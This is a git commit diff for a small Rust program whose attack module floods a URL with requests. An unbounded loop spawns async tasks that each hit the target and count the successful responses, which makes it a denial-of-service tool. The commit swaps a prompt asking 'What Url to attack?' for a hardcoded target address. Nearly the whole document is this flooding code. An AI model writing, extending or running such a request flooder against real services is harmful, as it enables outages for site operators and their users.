9634579b03b7dc3a47e1041c38d6940960b4867d
Carghai74 <94583299+carghai@users.noreply.github.com>
2022-09-19 18:34:53 -0400

    speed changes

--- src/attack.rs
+++ src/attack.rs
@@ -1,11 +1,8 @@
 use reqwest::Response;
 
-static mut ATTACK_URL: String = String::new();
-
 static mut AMOUNT: u128 = 0;
 
 pub async fn start() {
-    where_to_attack();
     core_attack();
 }
 async fn request(url: &str) -> Result<Response, reqwest::Error> {
@@ -19,27 +16,16 @@ async fn request(url: &str) -> Result<Response, reqwest::Error> {
 fn core_attack() {
     loop {
         tokio::spawn(async {
-            unsafe {
-                let error_data = request(&ATTACK_URL).await;
-                match error_data {
-                    Ok(_) => {
-                        AMOUNT = AMOUNT + 1;
-                        println!("{}", AMOUNT);
-                    }
-                    Err(data) => {
-                        println!("OH NO BAD Status Code Recived is {}", data.to_string())
-                    }
+            let error_data = request(&crate::ATTACK_URL).await;
+            match error_data {
+                Ok(_) => unsafe {
+                    AMOUNT = AMOUNT + 1;
+                    println!("{}", AMOUNT);
+                },
+                Err(data) => {
+                    println!("OH NO BAD Status Code Recived is {}", data.to_string())
                 }
             }
         });
-    }
-}
-
-fn where_to_attack() {
-    println!("What Url to attack?");
-    let mut line = String::new();
-    let _ = std::io::stdin().read_line(&mut line).unwrap();
-    unsafe {
-        ATTACK_URL = line;
     }
 }
--- src/main.rs
+++ src/main.rs
@@ -1,6 +1,7 @@
-
 mod attack;
 #[tokio::main]
 async fn main() {
     attack::start().await;
 }
+
+pub static ATTACK_URL: &str = "https://SecretWindingAttributes.carghai74.repl.co";
